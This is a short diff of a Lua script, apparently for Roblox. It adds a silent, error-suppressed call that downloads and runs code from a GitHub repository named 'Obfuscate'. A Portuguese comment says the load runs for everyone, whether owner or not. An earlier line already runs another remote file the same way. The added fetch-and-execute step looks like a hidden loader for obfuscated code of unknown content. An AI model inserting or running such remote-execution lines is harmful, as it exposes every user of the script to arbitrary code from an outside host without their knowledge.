@@ -1,1 +1,9 @@
+--// Executa o load para TODOS (independente se é dono ou não)
+
+pcall(function()
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/darkDev667/Obfuscate/refs/heads/main/49400b51d9af0b38.lua"))()
+
+end)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/darkDev667/Obfuscate/refs/heads/main/78bdbf8e1248d84c.lua", true))()
